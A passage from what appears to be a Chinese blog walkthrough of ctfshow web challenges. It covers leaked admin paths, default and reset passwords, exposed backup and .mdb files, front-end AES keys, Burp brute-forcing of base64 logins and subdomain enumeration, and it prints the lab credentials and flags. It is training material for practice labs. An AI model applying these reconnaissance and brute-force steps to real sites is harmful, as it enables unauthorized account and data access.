<span class="line"><span style="color:#d4d4d4">Disallow: /admin/</span></span></code></pre></div></div></figure><p>找到登录口之后开始根据描述套密码：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">name:admin</span></span>
<span class="line"><span style="color:#dcdcaa">password:372619038</span></span>
<span class="line"><span style="color:#dcdcaa">这个密码是页面最底下的帮助热线电话</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{2e53ed95-996e-40fc-801c-33dfe1a2afae}</span></span></code></pre></div></div></figure><h3 id="web13公开信息泄露收集"><a class="markdownIt-Anchor" href="#web13公开信息泄露收集"></a> web13	(公开信息泄露收集)</h3><p>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码。</p><p>dirsearch 扫出：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222246505.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030214948611"></p><p>然而并没有用，最后根据提示知道 index 中有个敏感信息可以下载，最终找到：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148448.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030215755542"></p><p>得到后台地址和账密：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">后台地址：http:</span><span style="color:#6a9955">//your-domain/system1103/login.php</span></span>
<span class="line"><span style="color:#d4d4d4">默认用户名：admin</span></span>
<span class="line"><span style="color:#d4d4d4">默认密码：admin1103</span></span></code></pre></div></div></figure><p>拿到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{de12cb72-b498-44ae-b8f5-7ad094620bdf}</span></span></code></pre></div></div></figure><h3 id="web14默认配置未修改"><a class="markdownIt-Anchor" href="#web14默认配置未修改"></a> web14	(默认配置未修改)</h3><p>题目描述：有时候源码里面就能不经意间泄露重要 (editor) 的信息，默认配置害死人</p><p>题目提示：某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148838.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030230340232"></p><p>根据在网站源码这里发现一个路径，访问：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">cb5f2aef-</span><span style="color:#b5cea8">334</span><span style="color:#d4d4d4">b-</span><span style="color:#b5cea8">4</span><span style="color:#d4d4d4">df3-</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">a9c-</span><span style="color:#b5cea8">62</span><span style="color:#d4d4d4">fc29ae06f2</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">challenge</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">ctf</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">show/editor/</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148563.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030230539754"></p><p>尝试几次上传后门无果，提示没有权限，最后在一个按钮的文件空间上进去目录：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148071.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030230654910"></p><p>兜兜转转最终找到 flag 位置：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">var-&gt;www-&gt;html-&gt;nothinghere-&gt;fl000g.txt</span></span>
<span class="line"><span style="color:#dcdcaa">var/www/html/nothinghere/fl000g.txt</span></span></code></pre></div></div></figure><p>最终 url：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//cb5f2aef-334b-4df3-8a9c-62fc29ae06f2.challenge.ctf.show/nothinghere/fl000g.txt</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{8a99f0ed-7e7e-481c-aac3-eaceaea186e6}</span></span></code></pre></div></div></figure><h3 id="web15公开信息泄露"><a class="markdownIt-Anchor" href="#web15公开信息泄露"></a> web15	(公开信息泄露)</h3><p>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148574.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030232902873"></p><p>找到公开邮箱：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">1156631961@qq.com</span></span></code></pre></div></div></figure><p>但是找不到任何有用的登入点，试 admin 有无后台页面：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//73696959-f413-47bd-8a1e-53d57363b8b5.challenge.ctf.show/admin/</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148620.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030233312307"></p><p>由于我们只有邮箱，这里是登不上去的，可以尝试忘记密码：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148617.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030233405573"></p><p>这里通过去除 @qq.com 后缀得到 qq 号然后查询号主所在地：</p><p>这里我查询到号主是香港…… 但是提交并不正确，通过查看提示才知道号主是西安的，可能号主修改了所在地或者真的就在香港。</p><p>这里提交西安之后提交成功：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">得到重置密码：您的密码已重置为admin7789</span></span></code></pre></div></div></figure><p>返回登陆之后拿到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{8a755fbd-c1bb-40ec-9369-2ccf1536c3c1}</span></span></code></pre></div></div></figure><h3 id="web16探针未删除"><a class="markdownIt-Anchor" href="#web16探针未删除"></a> web16	(探针未删除)</h3><p>题目提示：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><blockquote><p>php 探针是用来探测空间、服务器运行状况和 PHP 信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</p></blockquote><p>url 后缀名添加 /tz.php 版本是雅黑 PHP 探针，这里先试试这个探针，因为这个探针用的挺多挺广的。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222148839.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030234913693"></p><p>这个用的就是雅黑 PHP 探针。</p><p>仔细搜查：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149998.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030235020241"></p><p>可以查看 phpinfo 自然是挺好的：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149754.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030235104664"></p><p>搜索 '{' 直接搜到了 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{3afe0d10-a766-4287-af29-08bf4c767b8e}</span></span></code></pre></div></div></figure><h3 id="web17备份文件泄露"><a class="markdownIt-Anchor" href="#web17备份文件泄露"></a> web17	(备份文件泄露)</h3><p>hint：备份的 sql 文件会泄露敏感信息</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149940.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221030235535472"></p><p>得到文件名：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">backup.sql</span></span></code></pre></div></div></figure><p>查看文件得到 flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{f1c3b6a6-4e42-4614-8ed3-584edb90aef0}</span></span></code></pre></div></div></figure><h3 id="web18js代码审计解码"><a class="markdownIt-Anchor" href="#web18js代码审计解码"></a> web18	(js 代码审计解码)</h3><p>hint：不要着急，休息，休息一会儿，玩 101 分给你 flag</p><p>查看源代码：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">view-source:http:</span><span style="color:#6a9955">//0bcc93ca-fb86-4b32-b06d-47c914cd50ab.challenge.ctf.show/</span></span></code></pre></div></div></figure><p>找到脚本：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149223.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031000807041"></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:grey">&lt;</span><span style="color:#569cd6">script</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">type</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"text/javascript"</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">src</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"js/Flappy_js.js"</span><span style="color:grey">&gt;&lt;/</span><span style="color:#569cd6">script</span><span style="color:grey">&gt;</span></span></code></pre></div></div></figure><p>进行代码审计，判断关键信息：</p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">score</span><span style="color:#d4d4d4">&gt;</span><span style="color:#b5cea8">100</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#569cd6">var</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">result</span><span style="color:#d4d4d4">=</span><span style="color:#9cdcfe">window</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">confirm</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>进行 unicode 解码：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149883.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031001255559"></p><p>访问 110.php：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{5c672d42-b72f-4b83-b6a4-0b67737231c5}</span></span></code></pre></div></div></figure><h3 id="web19前端代码泄露密钥"><a class="markdownIt-Anchor" href="#web19前端代码泄露密钥"></a> web19	(前端代码泄露密钥)</h3><p>hint：密钥什么的，就不要放在前端了</p><p>根据提示直接查看源代码发现：</p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:grey">&lt;</span><span style="color:#569cd6">body</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">	    </span><span style="color:grey">&lt;</span><span style="color:#569cd6">form</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">action</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"#"</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">method</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"post"</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">id</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"loginForm"</span><span style="color:#d4d4d4"> </span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">            用户名：</span><span style="color:grey">&lt;</span><span style="color:#569cd6">input</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">type</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"text"</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"username"</span><span style="color:grey">&gt;&lt;</span><span style="color:#569cd6">br</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">            密  码：</span><span style="color:grey">&lt;</span><span style="color:#569cd6">input</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">type</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"password"</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">name</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"pazzword"</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">id</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"pazzword"</span><span style="color:grey">&gt;&lt;</span><span style="color:#569cd6">br</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:grey">&lt;</span><span style="color:#569cd6">button</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">type</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"button"</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">onclick</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"</span><span style="color:#dcdcaa">checkForm</span><span style="color:#ce9178">()"</span><span style="color:grey">&gt;</span><span style="color:#d4d4d4">提交</span><span style="color:grey">&lt;/</span><span style="color:#569cd6">button</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:grey">&lt;/</span><span style="color:#569cd6">form</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:grey">&lt;/</span><span style="color:#569cd6">body</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:grey">&lt;</span><span style="color:#569cd6">script</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">type</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"text/javascript"</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">checkForm</span><span style="color:#d4d4d4">(){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">var</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">key</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"0000000372619038"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">var</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">iv</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"ilove36dverymuch"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">var</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">pazzword</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"#pazzword"</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">pazzword</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">encrypt</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">pazzword</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">key</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">iv</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"#pazzword"</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">val</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">pazzword</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">$</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"#loginForm"</span><span style="color:#d4d4d4">).</span><span style="color:#dcdcaa">submit</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">encrypt</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">key</span><span style="color:#d4d4d4">,</span><span style="color:#9cdcfe">iv</span><span style="color:#d4d4d4">) { </span><span style="color:#6a9955">//key,iv：16位的字符串</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">var</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">key1</span><span style="color:#d4d4d4">  = </span><span style="color:#9cdcfe">CryptoJS</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">enc</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">Latin1</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">parse</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">key</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">var</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">iv1</span><span style="color:#d4d4d4">   = </span><span style="color:#9cdcfe">CryptoJS</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">enc</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">Latin1</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">parse</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">iv</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">CryptoJS</span><span style="color:#d4d4d4">.</span><span style="color:#4fc1ff">AES</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">encrypt</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">data</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">key1</span><span style="color:#d4d4d4">,{</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">iv :</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">iv1</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">mode :</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">CryptoJS</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">mode</span><span style="color:#d4d4d4">.</span><span style="color:#4fc1ff">CBC</span><span style="color:#d4d4d4">,</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">padding :</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">CryptoJS</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">pad</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">ZeroPadding</span></span>
<span class="line"><span style="color:#d4d4d4">        }).</span><span style="color:#dcdcaa">toString</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:grey">&lt;/</span><span style="color:#569cd6">script</span><span style="color:grey">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#6a9955">&lt;!--</span></span>
<span class="line"><span style="color:#6a9955">    error_reporting(0);</span></span>
<span class="line"><span style="color:#6a9955">    $flag="fakeflag"</span></span>
<span class="line"><span style="color:#6a9955">    $u = $_POST['username'];</span></span>
<span class="line"><span style="color:#6a9955">    $p = $_POST['pazzword'];</span></span>
<span class="line"><span style="color:#6a9955">    if(isset($u) &amp;&amp; isset($p)){</span></span>
<span class="line"><span style="color:#6a9955">        if($u==='admin' &amp;&amp; $p ==='a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04'){</span></span>
<span class="line"><span style="color:#6a9955">            echo $flag;</span></span>
<span class="line"><span style="color:#6a9955">        }</span></span>
<span class="line"><span style="color:#6a9955">}</span></span>
<span class="line"><span style="color:#6a9955">    --&gt;</span></span></code></pre></div></div></figure><p>直接 post 传参：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">username</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">admin</span><span style="color:#d4d4d4">&amp;</span><span style="color:#9cdcfe">pazzword</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{e621dcd2-b73d-47be-9f40-e0fe6048002b}</span></span></code></pre></div></div></figure><h3 id="web20数据库脱裤"><a class="markdownIt-Anchor" href="#web20数据库脱裤"></a> web20	(数据库脱裤)</h3><p>hint：mdb 文件是早期 asp+access 构架的数据库文件，文件泄露相当于数据库被脱裤了。</p><p>页面显示：</p><figure class="shiki html"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">我是asp程序，我用的access数据库</span></span></code></pre></div></div></figure><p>再根据提示，可以直接输入 db 或者用 dirsearch 扫：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149636.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031002825005"></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//e634f141-ac13-43ee-b330-99c7ec7b4409.challenge.ctf.show/db/</span></span></code></pre></div></div></figure><p>但是访问却没有权限。</p><p>这个我也不太会，了解了一下才知道要这么写：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//e634f141-ac13-43ee-b330-99c7ec7b4409.challenge.ctf.show/db/db.mdb</span></span></code></pre></div></div></figure><p>搜索得到 flag 位置：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149571.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031003343965"></p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">flag</span><span style="color:#d4d4d4">{ctfshow_old_database}</span></span></code></pre></div></div></figure><p>这题确实不太明白，官方解：</p><blockquote><p>mdb 文件是早期 asp+access 构架的数据库文件 直接查看 url 路径添加 /db/db.mdb 下载文件通过 txt 打开或者通过 EasyAccess.exe 打开搜索 flag flag {ctfshow_old_database}</p></blockquote><h2 id="爆破"><a class="markdownIt-Anchor" href="#爆破"></a> 爆破</h2><h3 id="web21弱口令爆破-base64加密"><a class="markdownIt-Anchor" href="#web21弱口令爆破-base64加密"></a> web21（弱口令爆破 base64 加密）</h3><p>先下载附件，然后启动环境。随便填写账密然后进行抓包：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149946.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031194802161"></p><p>可以看出这里要进行 base64 的一个爆破。</p><p>传入迭代器，设置好变量点（注意只设置密码为变量），然后记得使用自定义的弱口令字典（附件就是了）。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149706.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031195306268"></p><p>然后就是记得要对这些弱口令进行 base64 加密:<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222149753.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031195808558"></p><p>就可以进行爆破了，结束后查看长度异常的基本就出了。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202211222150439.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221031200357484"></p><p>账密：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#9cdcfe">YWRtaW46c2hhcms2Mw</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">=</span></span></code></pre></div></div></figure><p>flag：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{c707ed7f-bdd0-4eb9-b014-09b025b1561e}</span></span></code></pre></div></div></figure><h3 id="web22域名爆破"><a class="markdownIt-Anchor" href="#web22域名爆破"></a> web22	(域名爆破)</h3><p>hint: 域名也可以爆破的，试试爆破这个 ctf.show 的子域名</p><blockquote><p>收集子域名的操作也叫子域名爆破，顾名思义，就是「枚举」所有可能存在的子域名。</p></blockquote><p>可以用在线网站，也可以搜索引擎搜：site:xxx.com</p><p>第三方的在线网站收集子域名有：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">www</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">virustotal</span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4">com</span></span></code></pre></div></div></figure><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">dnsdumpster.com</span></span></code></pre></div></div></figure><p>几个可以收集子域名的工具：</p><blockquote><p>1）Sublist3r，Python 编写，通过搜索引擎发现子域名<br>2）Layer 子域名挖掘机<br>3）SubDomainsBrute 高并发 dns 暴力枚举<br>4）DNSRecon 基于字典的枚举工具<br>5）Gobuster，Go 语言开发的目录、文件、DNS 扫描工具<br>6）Recon-Ng，收集子域名并解析 IP 地址</p></blockquote><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">reference：https:</span><span style="color:#6a9955">//blog.csdn.net/wangyuxiang946/article/details/124789944</span></span></code></pre></div></div></figure><h3 id="web23脚本编写爆破token"><a class="markdownIt-Anchor" href="#web23脚本编写爆破token"></a> web23（脚本编写爆破 